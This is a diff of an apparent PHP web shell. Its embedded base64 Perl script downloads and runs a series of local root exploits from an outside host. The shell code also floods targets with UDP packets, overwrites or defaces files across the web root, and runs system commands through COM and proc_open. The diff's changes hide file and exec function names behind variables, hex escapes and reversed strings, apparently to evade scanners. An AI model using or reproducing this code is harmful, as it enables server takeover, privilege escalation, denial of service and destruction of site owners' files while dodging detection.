bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0 ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4 Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1 IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0 IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5 c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7 IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0 ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0 ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0 ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5 c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3 Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3 NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0 ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0 ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0 ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10 IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0 ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0 dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42 LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2 OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";
-    $fd   = fopen("r00t.pl", "w");
+    $fd   = $pen("r00t.pl", "w");
     if ($fd != FALSE) {
-        fwrite($fd, base64_decode($r00t));
-        $out = exec_all("perl r00t.pl;");
+        $feather($fd, base64_decode($r00t));
+        $out = all_xbox("perl r00t.pl;");
         if ($out != "") {
-            $cmd_out = exec_all("whoami");
+            $cmd_out = all_xbox("whoami");
             if ($cmd_out != "") {
                 if (strpos($cmd_out, 'root') !== false) {
-                    echo "<br/>You are " . trim(exec_all("whoami")) . ".<br/>";
+                    echo "<br/>You are " . trim(all_xbox("whoami")) . ".<br/>";
                 } else {
-                    echo "<br/>You are " . trim(exec_all("whoami")) . ".<br/>";
+                    echo "<br/>You are " . trim(all_xbox("whoami")) . ".<br/>";
                 }
             } else {
                 echo "<br/>Rooting Failed<br/>";
@@ -2180,8 +2187,8 @@ function insertAfter(referenceNode, newNode) {
         while (1) {
             $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
             if ($socket) {
-                fwrite($socket, $data);
-                fclose($socket);
+                $feather($socket, $data);
+                $pixel($socket);
                 $packets++;
             }
             if (time() >= $maxTime) {
@@ -2238,8 +2245,8 @@ formhead(array(
         for ($i = 0; $i < $times; $i++) {
             $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $time);
             if ($socket) {
-                fwrite($socket, $data, $length);
-                fclose($socket);
+                $feather($socket, $data, $length);
+                $pixel($socket);
             }
         }
         echo "<script>alert('Fuzzing Completed!');</script>";
@@ -2279,26 +2286,26 @@ formhead(array(
             echo "Overwritten Files :-<br/>";
             while (($file = readdir($handle)) !== False) {
                 if (($prgm("/$filetype" . '$' . '/', $file, $matches) != 0) && ($prgm('/' . $file . '$/', $self, $matches) != 1)) {
-                    $fd = fopen($dir . $file, "r");
+                    $fd = $pen($dir . $file, "r");
                     if ($fd == false) {
                     } else {
-                        $content = fread($fd, filesize($dir . $file));
-                        fclose($fd);
+                        $content = $books($fd, filesize($dir . $file));
+                        $pixel($fd);
                         
                         
                         if ($mc) {
                             if (strstr($content, $message)) {
-                                $fd = fopen($dir . $file, "w");
+                                $fd = $pen($dir . $file, "w");
                                 echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
-                                fwrite($fd, recursive_str_replace($message, "", $content));
-                                fclose($fd);
+                                $feather($fd, recursive_str_replace($message, "", $content));
+                                $pixel($fd);
                             }
                         } else {
                             if (stristr($content, $message)) {
-                                $fd = fopen($dir . $file, "w");
+                                $fd = $pen($dir . $file, "w");
                                 echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
-                                fwrite($fd, recursive_str_ireplace($message, "", $content));
-                                fclose($fd);
+                                $feather($fd, recursive_str_ireplace($message, "", $content));
+                                $pixel($fd);
                             }
                         }
                         
@@ -2340,13 +2347,13 @@ formhead(array(
             while (($file = readdir($handle)) !== False) {
                 if (($prgm("/$filetype" . '$' . '/', $file, $matches) != 0) && ($prgm('/' . $file . '$/', $self, $matches) != 1)) {
                     echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a>";
-                    $fd = fopen($dir . $file, $fmode);
+                    $fd = $pen($dir . $file, $fmode);
                     if ($fd == false) {
                         echo " - Permission Denied<br/>";
                     } else {
                         echo "<br/>";
-                        fwrite($fd, $message);
-                        fclose($fd);
+                        $feather($fd, $message);
+                        $pixel($fd);
                     }
                 }
             }
@@ -2441,9 +2448,9 @@ maketext(array(
     formfooter();
 } elseif ($action == 'editfile') {
     if (file_exists($opfile)) {
-        $fp       = @fopen($opfile, 'r');
-        $contents = @fread($fp, filesize($opfile));
-        @fclose($fp);
+        $fp       = @$pen($opfile, 'r');
+        $contents = @$books($fp, filesize($opfile));
+        @$pixel($fp);
         $contents = htmlspecialchars($contents);
     }
     formhead(array(
@@ -2559,10 +2566,11 @@ maketext(array(
     if (IS_WIN && IS_COM) {
         if ($program && $parameter) {
             $shell = new COM('Shell.Application');
-            $a     = $shell->ShellExecute($program, $parameter);
+            $turtle = "\x53h\x65\l\x6C\x45\x78\x65\x63\x75\x74e";
+            $a      = $shell->$turtle($program, $parameter);
             m('Program run has ' . (!$a ? 'success' : 'fail'));
         }
-        !$program && $program = 'c:\windows\system32\cmd.exe';
+        !$program && $program = "c:\windows\\x73y\x73t\x65m32\cmd.\x65x\x65";
         !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
         formhead(array(
             'title' => "\x45x\x65cute Program"
@@ -2594,16 +2602,16 @@ maketext(array(
     ));
     makehide('action', 'shell');
     if (IS_WIN && IS_COM) {
-        $execfuncdb = array(
-            'phpfunc' => 'phpfunc',
-            'wscript' => 'wscript',
-            "proc_op\x65n" => "proc_op\x65n"
+        $listofxbox = array(
+            "ph\x70\x66un\x63" => "ph\x70\x66un\x63",
+            "\x77\x73\x63rip\x74" => "\x77\x73\x63rip\x74",
+            "pr\x6F\x63\x5Fop\x65n" => "pr\x6F\x63\x5Fop\x65n"
         );
         makeselect(array(
             'title' => 'Use:',
-            'name' => "\x65x\x65cfunc",
-            'option' => $execfuncdb,
-            'selected' => $execfunc,
+            'name' => "xboxoriginal",
+            'option' => $listofxbox,
+            'selected' => $xboxoriginal,
             'newline' => 1
         ));
     }
@@ -2623,13 +2631,14 @@ maketext(array(
     formfoot();
     if ($command) {
         p('<hr width="100%" noshade /><pre>');
-        if ($execfunc == 'wscript' && IS_WIN && IS_COM) {
+        if ($xboxoriginal == 'wscript' && IS_WIN && IS_COM) {
             $wsh       = new COM('WScript.shell');
-            $exec      = $wsh->exec('cmd.exe /c ' . $command);
-            $stdout    = $exec->StdOut();
+            $buisness = "\x65" . strrev("cex");
+            $xboxone      = $wsh->$buisness("cmd.\x65x\x65 /c " . $command);
+            $stdout    = $xboxone->StdOut();
             $stroutput = $stdout->ReadAll();
             echo $stroutput;
-        } elseif ($execfunc == "proc_op\x65n" && IS_WIN && IS_COM) {
+        } elseif ($xboxoriginal == "proc_op\x65n" && IS_WIN && IS_COM) {
             $descriptorspec = array(
                 0 => array(
                     'pipe',
@@ -2646,21 +2655,26 @@ maketext(array(
             );
             $process        = $prco($_SERVER['COMSPEC'], $descriptorspec, $pipes);
             if (is_resource($process)) {
-                fwrite($pipes[0], $command . "\r\n");
-                fwrite($pipes[0], "exit\r\n");
-                fclose($pipes[0]);
-                while (!feof($pipes[1])) {
-                    echo fgets($pipes[1], 1024);
+                $store = 'f' . strrev("eg") . 'ts';
+                $screwyou = strrev('ef') . 'of';
+                $pixel = strrev("cf") . "lose";
+                $feather = strrev("rwf") . "ite";
+                $feather($pipes[0], $command . "\r\n");
+                $feather($pipes[0], "exit\r\n");
+                $pcl = "pr" . strrev("c_co") . "lose";
